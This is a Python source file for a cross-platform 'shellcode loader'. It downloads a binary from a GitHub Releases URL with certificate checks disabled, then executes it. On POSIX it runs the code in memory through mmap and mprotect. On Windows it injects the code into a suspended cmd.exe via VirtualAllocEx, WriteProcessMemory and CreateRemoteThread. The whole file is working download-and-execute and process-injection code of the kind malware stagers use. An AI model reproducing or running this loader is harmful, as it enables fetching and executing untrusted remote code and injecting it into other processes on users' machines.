#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
PIC Shellcode Loader

Cross-platform loader for position-independent code.
Auto-detects platform and downloads the latest build from GitHub Releases.

Requires Python 2.6+ or 3.0+ (no third-party dependencies).

Usage:
    python loader.py
"""

from __future__ import print_function

import ctypes
import mmap
import os
import platform
import ssl
import struct
import sys
import time

# Python 2/3 urllib compatibility
try:
    from urllib.request import Request, urlopen
    from urllib.error import HTTPError
except ImportError:
    from urllib2 import Request, urlopen, HTTPError

# Disable ALL SSL verification globally --we download unsigned shellcode from
# public GitHub Releases, so cert checks add no security and break on hosts
# with outdated CA stores (Windows 7, Solaris, etc.).
try:
    ssl._create_default_https_context = ssl._create_unverified_context
except AttributeError:
    pass  # Python < 2.7.9 / 3.4.3: verification not enabled anyway

# Download URL template. Use {platform} and {arch} placeholders.
# Examples:
#   GitHub Releases: "https://github.com/user/repo/releases/download/latest/{platform}-{arch}.bin"
#   Custom server:   "https://example.com/builds/{platform}-{arch}.bin"
URL_TEMPLATE = "https://github.com/nostdlib/Position-Independent-Agent/releases/download/preview/{platform}-{arch}.bin"

# =============================================================================
# Logging
# =============================================================================

_LOG_LEVELS = {'dbg': 0, 'inf': 1, 'ok': 2, 'wrn': 3, 'err': 4}
_LOG_PREFIXES = {
    'dbg': '[DBG]',
    'inf': '[INF]',
    'ok':  '[INF]',
    'wrn': '[WRN]',
    'err': '[ERR]',
}
_log_verbosity = _LOG_LEVELS['dbg']


def _log(level, msg):
    """Log with timestamp, level prefix, and immediate flush."""
    if _LOG_LEVELS.get(level, 1) < _log_verbosity:
        return
    timestamp = time.strftime("%H:%M:%S")
    prefix = _LOG_PREFIXES.get(level, '[INF]')
    line = "%s [%s] %s" % (prefix, timestamp, msg)
    try:
        print(line)
    except UnicodeEncodeError:
        print(line.encode('ascii', 'replace').decode('ascii'))
    sys.stdout.flush()


def _hexdump(data, n=32):
    """Return first n bytes as a hex string for diagnostics."""
    chunk = data[:n]
    hex_str = ' '.join('%02x' % (b if isinstance(b, int) else ord(b)) for b in chunk)
    if len(data) > n:
        hex_str += ' ...'
    return hex_str

# =============================================================================
# Architecture Definitions
# =============================================================================

ARCH = {
    'i386':    {'bits': 32, 'family': 'x86'},
    'x86_64':  {'bits': 64, 'family': 'x86'},
    'armv7a':  {'bits': 32, 'family': 'arm'},
    'aarch64': {'bits': 64, 'family': 'arm'},
    'riscv32': {'bits': 32, 'family': 'riscv'},
    'riscv64': {'bits': 64, 'family': 'riscv'},
    'mips64':  {'bits': 64, 'family': 'mips'},
}

# =============================================================================
# Host Detection
# =============================================================================

_MACHINE_ALIASES = [
    (('amd64', 'x86_64', 'i86pc'), 'x86',   64),
    (('arm64', 'aarch64'),          'arm',   64),
    (('i386', 'i686', 'x86'),       'x86',   32),
    (('armv7l', 'armv7a'),          'arm',   32),
    (('riscv64',),                  'riscv', 64),
    (('riscv32',),                  'riscv', 32),
    (('mips64',),                   'mips',  64),
]

# (os, family, bits) -> (platform_name, arch_name)
_ARTIFACT_MAP = {
    ('linux',   'x86',   64): ('linux',   'x86_64'),
    ('linux',   'x86',   32): ('linux',   'i386'),
    ('linux',   'arm',   64): ('linux',   'aarch64'),
    ('linux',   'arm',   32): ('linux',   'armv7a'),
    ('linux',   'riscv', 64): ('linux',   'riscv64'),
    ('linux',   'riscv', 32): ('linux',   'riscv32'),
    ('linux',   'mips',  64): ('linux',   'mips64'),
    ('windows', 'x86',   64): ('windows', 'x86_64'),
    ('windows', 'x86',   32): ('windows', 'i386'),
    ('windows', 'arm',   64): ('windows', 'aarch64'),
    ('windows', 'arm',   32): ('windows', 'armv7a'),
    ('darwin',  'x86',   64): ('macos',   'x86_64'),
    ('darwin',  'arm',   64): ('macos',   'aarch64'),
    ('ios',     'arm',   64): ('ios',     'aarch64'),
    ('freebsd', 'x86',   64): ('freebsd', 'x86_64'),
    ('freebsd', 'x86',   32): ('freebsd', 'i386'),
    ('freebsd', 'arm',   64): ('freebsd', 'aarch64'),
    ('freebsd', 'riscv', 64): ('freebsd', 'riscv64'),
    ('sunos',   'x86',   64): ('solaris', 'x86_64'),
    ('sunos',   'x86',   32): ('solaris', 'i386'),
    ('sunos',   'arm',   64): ('solaris', 'aarch64'),
    ('android', 'arm',   64): ('android', 'aarch64'),
    ('android', 'arm',   32): ('android', 'armv7a'),
    ('android', 'x86',   64): ('android', 'x86_64'),
}


def _detect_os():
    """Detect the OS, distinguishing iOS and Android from their parent kernels."""
    if sys.platform == 'ios':
        return 'ios'
    os_name = platform.system().lower()
    if os_name == 'linux':
        if 'ANDROID_ROOT' in os.environ:
            return 'android'
        try:
            with open('/system/build.prop'):
                return 'android'
        except (OSError, IOError):
            pass
    if os_name == 'darwin':
        if os.path.isdir('/var/mobile') or os.path.exists('/usr/lib/libMobileGestalt.dylib'):
            return 'ios'
    return os_name


def _detect_arch():
    """Detect the CPU family and bitness from platform.machine()."""
    machine = platform.machine().lower()
    for aliases, family, bits in _MACHINE_ALIASES:
        if machine in aliases:
            return family, bits
    # iOS devices report model identifiers (e.g. 'iphone14,7', 'ipad13,4')
    if machine.startswith(('iphone', 'ipad', 'ipod', 'appletv', 'watch')):
        return 'arm', 64
    return machine, 64


def _detect_process_arch():
    """Detect the architecture of the current Python process on Windows.

    platform.machine() returns the physical CPU arch, but when Python is
    running under emulation (e.g. x86_64 on ARM64) the child processes
    it spawns will match the emulated arch, not the CPU.
    PROCESSOR_ARCHITECTURE reflects the process's own arch.
    """
    proc_arch = os.environ.get('PROCESSOR_ARCHITECTURE', '').lower()
    for aliases, family, bits in _MACHINE_ALIASES:
        if proc_arch in aliases:
            return family, bits
    return _detect_arch()


def get_host():
    """Returns (os_name, family, bits) for the current host."""
    family, bits = _detect_arch()
    return _detect_os(), family, bits


# =============================================================================
# Download from GitHub Releases
# =============================================================================

def _http_get(url):
    req = Request(url, headers={"User-Agent": "PIA-Loader/1.0"})
    _log('inf', "Connecting to %s ..." % url.split('/')[2])
    resp = urlopen(req)
    code = getattr(resp, 'status', None) or getattr(resp, 'code', '?')
    _log('ok', "HTTP %s -- reading response body" % code)
    try:
        data = resp.read()
        _log('ok', "Received %d bytes" % len(data))
        return data
    finally:
        resp.close()


def download(platform_name, arch):
    url = URL_TEMPLATE.replace("{platform}", platform_name).replace("{arch}", arch)

    _log('inf', "URL: %s" % url)
    _log('inf', "Downloading ...")
    try:
        data = _http_get(url)
    except HTTPError as e:
        if e.code == 404:
            _log('err', "Not found (HTTP 404): %s" % url)
            sys.exit(1)
        _log('err', "HTTP error %d: %s" % (e.code, e.reason))
        raise

    # Validate: reject obviously wrong payloads before executing as shellcode
    _log('inf', "Validating payload (%d bytes)" % len(data))
    _log('dbg', "Header: %s" % _hexdump(data))
    if len(data) < 64:
        _log('err', "Payload too small (%d bytes) --not valid shellcode" % len(data))
        sys.exit(1)
    header = data[:256]
    if b'<!DOCTYPE' in header or b'<html' in header or b'<HTML' in header:
        _log('err', "Payload is HTML, not shellcode (check network/proxy)")
        sys.exit(1)

    _log('ok', "Payload validated --%d bytes" % len(data))
    return data


# =============================================================================
# Execution -- POSIX (mmap + mprotect)
# =============================================================================

def _flush_icache(addr, size):
    """Flush instruction cache on ARM64 Darwin (macOS/iOS)."""
    machine = platform.machine().lower()
    if machine not in ('arm64', 'aarch64'):
        return
    os_name = platform.system().lower()
    if os_name == 'darwin' or sys.platform == 'ios':
        libc = ctypes.CDLL(None)
        libc.sys_icache_invalidate.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
        libc.sys_icache_invalidate.restype = None
        libc.sys_icache_invalidate(ctypes.c_void_p(addr), ctypes.c_size_t(size))


_PROT_READ = getattr(mmap, 'PROT_READ', 0x01)
_PROT_WRITE = getattr(mmap, 'PROT_WRITE', 0x02)
_PROT_EXEC = getattr(mmap, 'PROT_EXEC', 0x04)
_MAP_PRIVATE = getattr(mmap, 'MAP_PRIVATE', 0x02)


def run_mmap(shellcode):
    """Map shellcode RW, flip to RX via mprotect, execute."""
    size = len(shellcode)

    _log('inf', "mmap: allocating %d bytes (RW, MAP_PRIVATE)" % size)
    # MAP_PRIVATE is required --the default MAP_SHARED causes mprotect to
    # silently refuse PROT_EXEC on Solaris (and some hardened Linux kernels).
    mem = mmap.mmap(-1, size, flags=_MAP_PRIVATE, prot=_PROT_READ | _PROT_WRITE)
    mem.write(shellcode)
    addr = ctypes.addressof(ctypes.c_char.from_buffer(mem))
    _log('ok', "mmap: base=0x%x  size=%d" % (addr, size))

    libc = ctypes.CDLL(None, use_errno=True)
    page_size = os.sysconf('SC_PAGE_SIZE')
    aligned = addr & ~(page_size - 1)
    total = size + (addr - aligned)
    _log('inf', "mprotect: aligned=0x%x  total=%d  page_size=%d  prot=RX" % (aligned, total, page_size))
    if libc.mprotect(ctypes.c_void_p(aligned), ctypes.c_size_t(total),
                     _PROT_READ | _PROT_EXEC) != 0:
        raise OSError("mprotect failed (errno=%d)" % ctypes.get_errno())
    _log('ok', "mprotect: RW -> RX")

    _flush_icache(addr, size)

    _log('ok', "Entry point: 0x%x" % addr)
    _log('inf', "Transferring control to shellcode ...")
    return ctypes.CFUNCTYPE(ctypes.c_int)(addr)()


# =============================================================================
# Execution --Windows (process injection)
# =============================================================================

MEM_COMMIT_RESERVE                 = 0x3000
PAGE_READWRITE                     = 0x04
PAGE_EXECUTE_READ                  = 0x20
CREATE_SUSPENDED                   = 0x00000004
INFINITE                           = 0xFFFFFFFF

HOST_PROCESS = {
    'i386':    r'C:\Windows\SysWOW64\cmd.exe'
               if os.path.isdir(r'C:\Windows\SysWOW64') else
               r'C:\Windows\System32\cmd.exe',
    'x86_64':  r'C:\Windows\System32\cmd.exe',
    'armv7a':  r'C:\Windows\SysArm32\cmd.exe',
    'aarch64': r'C:\Windows\System32\cmd.exe',
}


def setup_kernel32():
    from ctypes import wintypes
    k32 = ctypes.windll.kernel32

    k32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
    k32.VirtualAllocEx.restype = wintypes.LPVOID

    k32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    k32.WriteProcessMemory.restype = wintypes.BOOL

    k32.CreateRemoteThread.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID]
    k32.CreateRemoteThread.restype = wintypes.HANDLE

    k32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
    k32.WaitForSingleObject.restype = wintypes.DWORD

    k32.GetExitCodeThread.argtypes = [wintypes.HANDLE, wintypes.LPDWORD]
    k32.GetExitCodeThread.restype = wintypes.BOOL

    k32.VirtualProtectEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
    k32.VirtualProtectEx.restype = wintypes.BOOL

    k32.CloseHandle.argtypes = [wintypes.HANDLE]
    k32.CloseHandle.restype = wintypes.BOOL

    k32.TerminateProcess.argtypes = [wintypes.HANDLE, wintypes.UINT]
    k32.TerminateProcess.restype = wintypes.BOOL

    k32.GetLastError.argtypes = []
    k32.GetLastError.restype = wintypes.DWORD

    k32.CreateProcessW.argtypes = [
        wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.LPVOID, wintypes.LPVOID,
        wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCWSTR,
        wintypes.LPVOID, wintypes.LPVOID
    ]
    k32.CreateProcessW.restype = wintypes.BOOL

    return k32


def run_injected(shellcode, target_arch):
    """Run shellcode via suspended-process injection (Windows only)."""
    from ctypes import wintypes

    host_exe = HOST_PROCESS.get(target_arch)
    if not host_exe or not os.path.exists(host_exe):
        raise OSError("No suitable host process for %s" % target_arch)

    _log('inf', "Target arch: %s  host process: %s" % (target_arch, host_exe))
    _log('dbg', "Configuring kernel32 API prototypes")

    k32 = setup_kernel32()
    _log('ok', "kernel32 API ready")

    class STARTUPINFOW(ctypes.Structure):
        _fields_ = [
            ("cb", wintypes.DWORD), ("lpReserved", wintypes.LPWSTR),
            ("lpDesktop", wintypes.LPWSTR), ("lpTitle", wintypes.LPWSTR),
            ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
            ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD),
            ("dwXCountChars", wintypes.DWORD), ("dwYCountChars", wintypes.DWORD),
            ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
            ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD),
            ("lpReserved2", ctypes.POINTER(wintypes.BYTE)),
            ("hStdInput", wintypes.HANDLE), ("hStdOutput", wintypes.HANDLE),
            ("hStdError", wintypes.HANDLE),
        ]

    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
            ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD),
        ]

    pi = PROCESS_INFORMATION()
    si = STARTUPINFOW()
    si.cb = ctypes.sizeof(STARTUPINFOW)

    if not k32.CreateProcessW(host_exe, None, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi)):
        raise OSError("CreateProcessW failed: %d" % k32.GetLastError())

    _log('ok', "CreateProcessW: PID=%d  handle=0x%x" % (pi.dwProcessId, pi.hProcess or 0))

    try:
        _log('inf', "VirtualAllocEx: size=%d  protect=PAGE_READWRITE (0x%02x)" % (len(shellcode), PAGE_READWRITE))
        remote_mem = k32.VirtualAllocEx(pi.hProcess, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE)
        if not remote_mem:
            raise OSError("VirtualAllocEx failed (GetLastError=%d)" % k32.GetLastError())
        _log('ok', "VirtualAllocEx: addr=0x%x" % remote_mem)

        _log('inf', "WriteProcessMemory: dst=0x%x  size=%d" % (remote_mem, len(shellcode)))
        written = ctypes.c_size_t()
        if not k32.WriteProcessMemory(pi.hProcess, remote_mem, shellcode, len(shellcode), ctypes.byref(written)):
            raise OSError("WriteProcessMemory failed (GetLastError=%d)" % k32.GetLastError())
        _log('ok', "WriteProcessMemory: %d / %d bytes written" % (written.value, len(shellcode)))

        _log('inf', "VirtualProtectEx: addr=0x%x  PAGE_READWRITE -> PAGE_EXECUTE_READ (0x%02x)" % (remote_mem, PAGE_EXECUTE_READ))
        old_protect = wintypes.DWORD()
        if not k32.VirtualProtectEx(pi.hProcess, remote_mem, len(shellcode), PAGE_EXECUTE_READ, ctypes.byref(old_protect)):
            raise OSError("VirtualProtectEx failed (GetLastError=%d)" % k32.GetLastError())
        _log('ok', "VirtualProtectEx: old_protect=0x%02x" % old_protect.value)

        _log('inf', "CreateRemoteThread: entry=0x%x" % remote_mem)
        remote_thread = k32.CreateRemoteThread(pi.hProcess, None, 0, remote_mem, None, 0, None)
        if not remote_thread:
            raise OSError("CreateRemoteThread failed (GetLastError=%d)" % k32.GetLastError())
        _log('ok', "CreateRemoteThread: handle=0x%x" % (remote_thread or 0))

        _log('inf', "WaitForSingleObject: waiting for thread completion ...")
        k32.WaitForSingleObject(remote_thread, INFINITE)

        code = wintypes.DWORD()
        k32.GetExitCodeThread(remote_thread, ctypes.byref(code))
        k32.CloseHandle(remote_thread)
        return code.value

    finally:
        k32.TerminateProcess(pi.hProcess, 0)
        k32.CloseHandle(pi.hThread)
        k32.CloseHandle(pi.hProcess)


# =============================================================================
# Entry Point
# =============================================================================

def main():
    host_os, host_family, host_bits = get_host()
    python_bits = struct.calcsize("P") * 8

    # On Windows, the Python process may be emulated (e.g. x86_64 on ARM64).
    # Child processes inherit the emulated arch, not the CPU arch, and
    # cross-arch CreateRemoteThread is not supported.  Use the process arch
    # for both artifact selection and injection.
    if host_os == 'windows':
        process_family, process_bits = _detect_process_arch()
        exec_bits = process_bits
    else:
        process_family, process_bits = host_family, host_bits
        # run_mmap executes in-process, so must match Python's bitness.
        exec_bits = python_bits

    _log('inf', "Host: %s/%s/%dbit" % (host_os, host_family, host_bits))
    _log('inf', "Python: %s (%dbit)" % (platform.python_version(), python_bits))
    _log('dbg', "sys.platform: %s  machine: %s" % (sys.platform, platform.machine()))
    if process_family != host_family:
        _log('inf', "Emulated: process is %s/%dbit on %s/%dbit CPU" % (process_family, process_bits, host_family, host_bits))
    _log('dbg', "Exec bits: %d  (method: %s)" % (exec_bits, "inject" if host_os == 'windows' else "mmap"))

    # Auto-detect platform and download latest build
    key = (host_os, process_family, exec_bits)
    if key not in _ARTIFACT_MAP:
        _log('err', "Unsupported host: %s/%s/%dbit (Python %dbit)"
             % (host_os, process_family, exec_bits, python_bits))
        sys.exit(1)

    plat, remote_arch = _ARTIFACT_MAP[key]
    _log('inf', "Platform: %s  arch: %s" % (plat, remote_arch))

    shellcode = download(plat, remote_arch)
    _log('ok', "Shellcode ready: %d bytes" % len(shellcode))

    if host_os == 'windows':
        code = run_injected(shellcode, remote_arch)
    else:
        code = run_mmap(shellcode)

    _log('ok', "Exit code: %d" % code)
    return_code = ctypes.c_int32(code).value
    _log('ok', "Interpreted as signed 32-bit: %d" % return_code)
    os._exit(return_code)


if __name__ == '__main__':
    main()
